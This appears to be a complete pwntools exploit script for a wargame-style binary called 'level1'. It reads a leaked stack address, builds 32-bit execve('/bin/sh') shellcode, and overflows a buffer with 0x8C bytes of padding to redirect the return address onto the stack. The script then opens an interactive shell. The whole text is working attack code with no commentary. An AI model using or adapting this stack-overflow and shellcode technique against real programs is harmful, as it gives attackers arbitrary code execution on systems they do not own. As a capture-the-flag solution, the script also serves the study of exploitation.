from pwn import *

context.arch = 'i386'

r = process('./level1')
r.recvuntil(':')
stack_addr = str(r.recvline(False)[:-1]).strip('b').strip("'")

shellcode_raw = '''
mov edx, 0
mov ecx, 0
mov eax, 0xB
mov ebx, '''
shellcode_raw += stack_addr
shellcode_raw += '\nint 0x80\n'
shellcode = asm(shellcode_raw)

stack_addr = int(stack_addr, 16)

r.send(b'/bin/sh\x00' + shellcode + b'\x00' * (0x8C - len(shellcode) - 8) + p32(stack_addr + 8))
r.interactive()
